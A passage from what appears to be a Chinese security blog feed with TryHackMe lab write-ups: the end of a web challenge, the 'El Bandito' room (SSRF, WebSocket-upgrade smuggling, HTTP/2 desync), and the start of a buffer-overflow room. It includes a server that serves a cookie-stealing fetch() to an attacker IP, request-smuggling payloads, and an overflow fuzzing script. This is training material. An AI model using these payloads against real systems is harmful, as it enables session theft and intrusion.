style="color: #ABB2BF"> </span><span style="color: #D19A66">action</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;http://challenge.thm/&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #D19A66">method</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;POST&quot;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #D19A66">enctype</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;text/plain&quot;</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">textarea</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">name</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;GET http://10.11.141.2:1337 HTTP/1.1</span></span><span class="line"><span style="color: #98C379">AAA: A&quot;</span><span style="color: #ABB2BF">&gt;placeholder1&lt;/</span><span style="color: #E06C75">textarea</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">button</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">type</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;submit&quot;</span><span style="color: #ABB2BF">&gt;placeholder2&lt;/</span><span style="color: #E06C75">button</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">form</span><span style="color: #ABB2BF">&gt;</span></span><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">script</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E5C07B">btn</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">submit</span><span style="color: #ABB2BF">() &lt;/</span><span style="color: #E06C75">script</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure><p>发送 Payload 的服务器</p><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">#!/usr/bin/python3</span></span><span class="line"><span style="color: #C678DD">from</span><span style="color: #ABB2BF"> http.server </span><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> BaseHTTPRequestHandler, HTTPServer</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">ExploitHandler</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">BaseHTTPRequestHandler</span><span style="color: #ABB2BF">):</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">def</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">do_GET</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B; font-style: italic">self</span><span style="color: #ABB2BF">):</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.path </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;/&#39;</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">send_response</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">200</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">send_header</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Access-Control-Allow-Origin&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;*&quot;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">send_header</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Content-type&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;text/html&quot;</span><span style="color: #ABB2BF">)</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">end_headers</span><span style="color: #ABB2BF">()</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">.wfile.</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">b</span><span style="color: #98C379">&quot;fetch(&#39;http://10.11.141.2:8080/&#39; + document.cookie)&quot;</span><span style="color: #ABB2BF">)</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">def</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">run_server</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66; font-style: italic">port</span><span style="color: #ABB2BF">=</span><span style="color: #D19A66">1337</span><span style="color: #ABB2BF">):   </span></span><span class="line"><span style="color: #ABB2BF">    server_address </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (</span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">, port)</span></span><span class="line"><span style="color: #ABB2BF">    httpd </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">HTTPServer</span><span style="color: #ABB2BF">(server_address, ExploitHandler)</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">f</span><span style="color: #98C379">&quot;Server running on port </span><span style="color: #D19A66">{</span><span style="color: #ABB2BF">port</span><span style="color: #D19A66">}</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">    httpd.</span><span style="color: #61AFEF">serve_forever</span><span style="color: #ABB2BF">()</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">__name__</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;__main__&#39;</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #61AFEF">run_server</span><span style="color: #ABB2BF">()</span></span></code></pre></div></div></figure><h1 id="El-Bandito"><a href="#El-Bandito" class="headerlink" title="El Bandito"></a>El Bandito</h1><p>技术点：Spring 薄弱点 + WebSocket 伪造 + HTTP&#x2F;2 降级 HTTP&#x2F;1.1 利用</p><h2 id="信息收集阶段"><a href="#信息收集阶段" class="headerlink" title="信息收集阶段"></a>信息收集阶段</h2><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">nmap -sC -sV -p 22,80,631,8080 elbandito.thm</span></span></code></pre></div></div></figure><img src="/thm_wap/image-20250729152931821.png" class="" title="image-20250729152931821"><p>80 端口打不开，其实是 https 这里学到了可以通过指定端口号再加 -sC 探测服务</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">nmap -sC -sV -p 22,80,631,8080 elbandito.thm</span></span></code></pre></div></div></figure><p>631 有一个 cups 服务器，这个实际上一点用都没有，还以为切入点在这里</p><p>8080 是一个 web 服务器。网页里面有请求发起 websocket 连接，但是返回失败。然后图标是一个 Spring 的图标。</p><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>从这里 <a href="http://10.10.138.222:8080/services.html">http://10.10.138.222:8080/services.html</a></p><p>发现两个域名，加进 hosts</p><ul><li>bandito.websocket.thm</li><li>bandito.public.thm</li></ul><p>实际上这个一点用都没有，查看页面源代码里面发现看到他是请求一个 isOnline 的接口，这里我们是不是可以想到 SSRF 呢，先本地搭一个服务端，url 填进去测试 ok。然后试试能不能伪造 WebSocket 升级成功的消息，同样可以。</p><h3 id="找切入点"><a href="#找切入点" class="headerlink" title="找切入点"></a>找切入点</h3><p>通过 Gobuster 遍历出来了一堆目录，但是没有什么有效信息，但是通过这个网页给了我一点启发。</p><p><a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/spring-actuators.html">https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/spring-actuators.html</a></p><p>Spring 有可以拿到信息的接口，但是有些地方是不允许访问的，我觉得是加了来源 IP 验证之类的机制，有下面这些：</p><ul><li><code>/dump</code>, <code>/trace</code>, <code>/logfile</code>, <code>/shutdown</code>, <code>/mappings</code>, <code>/env</code>, <code>/actuator/env</code>, <code>/restart</code>, and <code>/heapdump</code>.</li></ul><p>有了目标之后，就可以利用 SSRF 去伪造 WebSocket 升级，然后利用去访问受限制的端点。</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">GET //isOnline?url=http://10.11.141.2:5555 HTTP/1.1</span></span><span class="line"><span style="color: #abb2bf">Host: bandito.websocket.thm:8080</span></span><span class="line"><span style="color: #abb2bf">Sec-WebSocket-Version: 13</span></span><span class="line"><span style="color: #abb2bf">Upgrade: WebSocket</span></span><span class="line"><span style="color: #abb2bf">Connection: Upgrade</span></span><span class="line"><span style="color: #abb2bf">Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">GET /env HTTP/1.1</span></span><span class="line"><span style="color: #abb2bf">Host: bandito.websocket.thm:8080</span></span></code></pre></div></div></figure><p>发现 <code>/admin-creds</code> 和 <code>/admin-flag</code> ，顺利拿到第一关的 flag 和第二关的入口。</p><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>在 Spring 应用程序中，&#x2F;trace 端点通常与 Spring Boot Actuator 模块相关联。它的主要作用是提供对最近 HTTP 请求的追踪信息。</p><h4 id="trace-端点的作用"><a href="#trace-端点的作用" class="headerlink" title="&#x2F;trace 端点的作用"></a>&#x2F;trace 端点的作用</h4><p>当 Spring Boot Actuator 的 &#x2F;trace 端点被启用并暴露时，访问这个路径会返回一个 JSON 格式的列表，其中包含了应用程序最近处理过的 HTTP 请求的详细信息。这些信息通常包括：</p><ul><li><p>请求方法 (e.g., GET, POST)</p></li><li><p>请求路径 (e.g., &#x2F;api&#x2F;users)</p></li><li><p>请求头 (Headers)</p></li><li><p>响应头 (Headers)</p></li><li><p>HTTP 状态码 (e.g., 200 OK, 404 Not Found)</p></li><li><p>请求时间戳</p></li><li><p>请求耗时</p></li></ul><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>注意这一关是 https 的 80 端口，登录进去之后发现是一个聊天室应用，刚开始尝试 XSS 都被 SOP 拦了，后面看了一下 wp 才知道，这个是利用 HTTP&#x2F;2 可能兼容 HTTP&#x2F;1.1 的机制。一个端口可以支持 HTTP&#x2F;2 也可以支持 HTTP&#x2F;1.1，然后利用页面上的一些可以回显或者存储的地方，把别人的请求头偷出来。</p><p>我的 Payload 如下，注意取消掉那个更新 Content-Length，刚开始发现 Content-Length 太小了没抓到想要的信息，后面改大了点成功拿下。</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">POST /send_message HTTP/2</span></span><span class="line"><span style="color: #abb2bf">Host: bandito.public.thm:80</span></span><span class="line"><span style="color: #abb2bf">Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aIiNBQ.wx3IENsjmSyGaWrE0mUIZaP8Tq4</span></span><span class="line"><span style="color: #abb2bf">Content-Length: 0</span></span><span class="line"><span style="color: #abb2bf">Pragma: no-cache</span></span><span class="line"><span style="color: #abb2bf">Cache-Control: no-cache</span></span><span class="line"><span style="color: #abb2bf">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span></span><span class="line"><span style="color: #abb2bf">Accept-Language: zh-CN,zh;q=0.9</span></span><span class="line"><span style="color: #abb2bf">Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;137&quot;, &quot;Not/A)Brand&quot;;v=&quot;24&quot;</span></span><span class="line"><span style="color: #abb2bf">Content-Type: application/x-www-form-urlencoded</span></span><span class="line"><span style="color: #abb2bf">Sec-Ch-Ua-Mobile: ?0</span></span><span class="line"><span style="color: #abb2bf">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</span></span><span class="line"><span style="color: #abb2bf">Accept: */*</span></span><span class="line"><span style="color: #abb2bf">Origin: https://bandito.public.thm:80</span></span><span class="line"><span style="color: #abb2bf">Sec-Fetch-Site: same-origin</span></span><span class="line"><span style="color: #abb2bf">Sec-Fetch-Mode: cors</span></span><span class="line"><span style="color: #abb2bf">Sec-Fetch-Dest: empty</span></span><span class="line"><span style="color: #abb2bf">Referer: https://bandito.public.thm:80/messages</span></span><span class="line"><span style="color: #abb2bf">Accept-Encoding: gzip, deflate, br</span></span><span class="line"><span style="color: #abb2bf">Priority: u=1, i</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">POST /send_message HTTP/1.1</span></span><span class="line"><span style="color: #abb2bf">Host: bandito.public.thm:80</span></span><span class="line"><span style="color: #abb2bf">Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.aIiNBQ.wx3IENsjmSyGaWrE0mUIZaP8Tq4</span></span><span class="line"><span style="color: #abb2bf">Content-Length: 700</span></span><span class="line"><span style="color: #abb2bf">Pragma: no-cache</span></span><span class="line"><span style="color: #abb2bf">Cache-Control: no-cache</span></span><span class="line"><span style="color: #abb2bf">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span></span><span class="line"><span style="color: #abb2bf">Accept-Language: zh-CN,zh;q=0.9</span></span><span class="line"><span style="color: #abb2bf">Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;137&quot;, &quot;Not/A)Brand&quot;;v=&quot;24&quot;</span></span><span class="line"><span style="color: #abb2bf">Content-Type: application/x-www-form-urlencoded</span></span><span class="line"><span style="color: #abb2bf">Sec-Ch-Ua-Mobile: ?0</span></span><span class="line"><span style="color: #abb2bf">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</span></span><span class="line"><span style="color: #abb2bf">Accept: */*</span></span><span class="line"><span style="color: #abb2bf">Origin: https://bandito.public.thm:80</span></span><span class="line"><span style="color: #abb2bf">Sec-Fetch-Site: same-origin</span></span><span class="line"><span style="color: #abb2bf">Sec-Fetch-Mode: cors</span></span><span class="line"><span style="color: #abb2bf">Sec-Fetch-Dest: empty</span></span><span class="line"><span style="color: #abb2bf">Referer: https://bandito.public.thm:80/messages</span></span><span class="line"><span style="color: #abb2bf">Accept-Encoding: gzip, deflate, br</span></span><span class="line"><span style="color: #abb2bf">Priority: u=1, i</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">data=</span></span></code></pre></div></div></figure><p><code>data=</code> 后面不要有任何数据。</p><h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><p>其实这个房间好奇怪，我发现他用了 HTTP&#x2F;2 但是那些伪头一个都没用，然后他这种 HTTP2 和 HTTP1.1 混在一个包里面发，我很好奇他实际发出去的数据包是什么样的，看 burp 中的 hex 格式，里面分隔也用的是 <code>0d 0a</code> ，或许要用 Wireshark 抓包才能看到实际的数据包格式。</p><p>这章总体来说难度不高，但是还是挺考验之前 Rooms 所学到的东西的。光研究这一个 Room 我的一个下午就没了，不过也把 WAP 结束了。</p><p>不过发现了一个有用的网站：<a href="https://book.hacktricks.wiki/">https://book.hacktricks.wiki/</a> 里面有很多针对不同应用的思路，挺好的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前言：感觉纯粹是为了记录而记录的，回过头来看，基本上忘记的差不多了，只有一个大概的印象，看来之后回去还是得要复习一下，不过也留了记录了，之后这个笔记会完善的。&lt;/p&gt;
&lt;p&gt;可以看看之后的 WP，比如说 AD、Red Teaming 那些，大部分都是我通关一遍之后再来单独整</summary>
      
    
    
    
    <category term="THM" scheme="https://blog.irec.moe/categories/THM/"/>
    
    
    <category term="WEB" scheme="https://blog.irec.moe/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>Try Hack Me - Buffer Overflow Prep</title>
    <link href="https://blog.irec.moe/thm_bufferoverflow.html"/>
    <id>https://blog.irec.moe/thm_bufferoverflow.html</id>
    <published>2025-07-07T16:00:00.000Z</published>
    <updated>2025-07-07T17:54:35.285Z</updated>
    
    <content type="html"><![CDATA[<p>Room：<a href="https://tryhackme.com/room/bufferoverflowprep">https://tryhackme.com/room/bufferoverflowprep</a></p><p>首先这个房间要有一点点计算机的底层知识，建议开始之前去了解一下。</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h3><p>EIP 是 <strong>x86 架构（32 位）CPU 中的一个特殊寄存器</strong>。它非常重要，因为它<strong>存储着 CPU 下一条要执行的指令的内存地址</strong>。</p><h3 id="Immunity-Debugger"><a href="#Immunity-Debugger" class="headerlink" title="Immunity Debugger"></a>Immunity Debugger</h3><p>是调试器，类似 OllyDbg x64dbg &#x2F; x32dbg 这种软件，分析调试软件用的。</p><h3 id="Mona"><a href="#Mona" class="headerlink" title="Mona"></a>Mona</h3><p><strong>Mona</strong> 是一个功能强大的 <strong>Python 脚本</strong>，专门设计用于扩展和增强 <strong>Immunity Debugger</strong> 或 <strong>WinDbg</strong> 这类调试器的功能。它在<strong>漏洞利用（Exploit Development）</strong>和<strong>逆向工程（Reverse Engineering）</strong>领域非常受欢迎，特别是用于自动化许多在<strong>缓冲区溢出（Buffer Overflow）</strong>漏洞利用过程中繁琐且耗时的任务。</p><h3 id="模式字符串（Pattern-String）"><a href="#模式字符串（Pattern-String）" class="headerlink" title="模式字符串（Pattern String）"></a>模式字符串（Pattern String）</h3><p>是在<strong>缓冲区溢出漏洞利用</strong>中用于<strong>精确计算 EIP（指令指针）偏移量</strong>的一种特殊字符串。它由一系列<strong>唯一且按特定算法生成</strong>的字符或字节组成，其独特性在于字符串中的任何一个固定长度的片段都只会在整个字符串的<strong>唯一一个位置</strong>出现。当你将足够长的模式字符串作为输入发送给易受攻击的程序，并导致其崩溃时，被模式字符串片段覆盖的 EIP 寄存器值就如同一个“指纹”或“线索”。通过工具（如 Metasploit 的 <code>pattern_offset.rb</code> 或 Mona 的 <code>findmsp</code> 命令）反向查找这个“指纹”在原始模式字符串中的位置，你就能<strong>精确地确定从输入起始点到 EIP 的字节偏移量</strong>，从而知道需要填充多少垃圾数据才能精准控制程序执行流。</p><h3 id="字节序（Endianness）"><a href="#字节序（Endianness）" class="headerlink" title="字节序（Endianness）"></a>字节序（Endianness）</h3><p>字节序指的是<strong>多字节数据（例如一个 32 位整数或一个内存地址）在计算机内存中存储的字节顺序</strong>。主要有两种类型：</p><ol><li>**大端序 (Big-Endian)**：<ul><li><strong>最高有效字节 (Most Significant Byte, MSB)</strong> 存储在<strong>最低内存地址</strong>。</li><li>就像我们写数字一样：<code>0x12345678</code> 会被存储为 <code>12 34 56 78</code>。</li></ul></li><li>**小端序 (Little-Endian)**：<ul><li><strong>最低有效字节 (Least Significant Byte, LSB)</strong> 存储在<strong>最低内存地址</strong>。</li><li><code>0x12345678</code> 会被存储为 <code>78 56 34 12</code>。</li></ul></li></ol><h3 id="坏字符（Bad-Characters）"><a href="#坏字符（Bad-Characters）" class="headerlink" title="坏字符（Bad Characters）"></a>坏字符（Bad Characters）</h3><p>在缓冲区溢出漏洞利用中，你的目标是将一段特定的字节序列（通常是 Shellcode 和返回地址）写入到程序的内存中。然而，程序在处理输入时，可能会使用一些<strong>字符串操作函数</strong>（例如 C 语言中的 <code>strcpy()</code>、<code>strcat()</code>、<code>sprintf()</code> 等）。</p><p>这些函数有特定的行为：</p><ol><li><strong>空字节 (<code>\x00</code>)：</strong> 这是最常见的坏字符。许多字符串函数会将 <code>\x00</code> 解释为字符串的结束符。如果你的 Shellcode 中包含 <code>\x00</code>，那么当这些函数复制你的 Payload 时，它们会在遇到第一个 <code>\x00</code> 时就停止复制，导致 <code>\x00</code> 后面的 Shellcode 部分被截断，无法完整写入内存，从而执行失败。</li><li><strong>其他特殊字符：</strong> 除了 <code>\x00</code>，某些应用程序或协议可能还会对其他特定字节值进行特殊处理。例如：<ul><li><strong>回车 (<code>\x0d</code>) 和换行 (<code>\x0a</code>)：</strong> 在某些基于行的输入协议中，这些字符可能被视为行的结束符，导致你的 Payload 被截断。</li><li><strong>空 ASCII 字符 (<code>\x20</code>，空格)：</strong> 有些协议可能不允许在特定位置出现空格。</li><li><strong>其他 ASCII 控制字符或编码问题：</strong> 有些应用程序在处理某些字节值时可能会将其误认为是控制字符，导致数据被修改或丢弃。</li></ul></li></ol><hr><h2 id="连接机器"><a href="#连接机器" class="headerlink" title="连接机器"></a>连接机器</h2><p>这里我试了好久，网上关于 <code>xfreerdp3</code> 的教程基本上没有。实际上这个软件体验很差，我最后用 socat 映射 3389 给本机，用 mstsc 。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">xfreerdp3</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/u:admin</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/p:password</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/cert:ignore</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/sec:rdp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/tls:enforce:1.0</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/v:10.10.3.91</span></span></code></pre></div></div></figure><p>打开 <code>Immunity Debugger</code> 执行这个命令，设置 mona 的工作文件夹。</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">!mona config -set workingfolder c:\mona\%p</span></span></code></pre></div></div></figure><p>然后让我们用 nc 连一下服务器，是一个交互程序，好像是让我测试不同的入口会发生什么不一样的错误这样。</p><h2 id="找崩溃区间"><a href="#找崩溃区间" class="headerlink" title="找崩溃区间"></a>找崩溃区间</h2><p>生成了一个一直增加发送字符的脚本，步进是 100bytes</p><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">#!/usr/bin/env python3</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> socket, time, sys</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">ip </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;10.10.3.91&quot;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">port </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1337</span></span><span class="line"><span style="color: #ABB2BF">timeout </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">5</span></span><span class="line"><span style="color: #ABB2BF">prefix </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;OVERFLOW1 &quot;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">string </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> prefix </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;A&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">100</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">while</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">True</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">try</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">with</span><span style="color: #ABB2BF"> socket.</span><span style="color: #61AFEF">socket</span><span style="color: #ABB2BF">(socket.</span><span style="color: #D19A66">AF_INET</span><span style="color: #ABB2BF">, socket.</span><span style="color: #D19A66">SOCK_STREAM</span><span style="color: #ABB2BF">) </span><span style="color: #C678DD">as</span><span style="color: #ABB2BF"> s:</span></span><span class="line"><span style="color: #ABB2BF">      s.</span><span style="color: #61AFEF">settimeout</span><span style="color: #ABB2BF">(timeout)</span></span><span class="line"><span style="color: #ABB2BF">      s.</span><span style="color: #61AFEF">connect</span><span style="color: #ABB2BF">((ip, port))</span></span><span class="line"><span style="color: #ABB2BF">      s.</span><span style="color: #61AFEF">recv</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1024</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">      </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Fuzzing with </span><span style="color: #D19A66">{}</span><span style="color: #98C379"> bytes&quot;</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">format</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">len</span><span style="color: #ABB2BF">(string) </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">len</span><span style="color: #ABB2BF">(prefix)))</span></span><span class="line"><span style="color: #ABB2BF">      s.</span><span style="color: #61AFEF">send</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">bytes</span><span style="color: #ABB2BF">(string, </span><span style="color: #98C379">&quot;latin-1&quot;</span><span style="color: #ABB2BF">))</span></span><span class="line"><span style="color: #ABB2BF">      s.</span><span style="color: #61AFEF">recv</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1024</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #C678DD">except</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Fuzzing crashed at </span><span style="color: #D19A66">{}</span><span style="color: #98C379"> bytes&quot;</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">format</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">len</span><span style="color: #ABB2BF">(string) </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">len</span><span style="color: #ABB2BF">(prefix)))</span></span><span class="line"><span style="color: #ABB2BF">    sys.</span><span style="color: #61AFEF">exit</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">  string </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">100</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;A&quot;</span></span><span class="line"><span style="color: #ABB2BF">  time.</span><span style="color: #61AFEF">sleep</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: 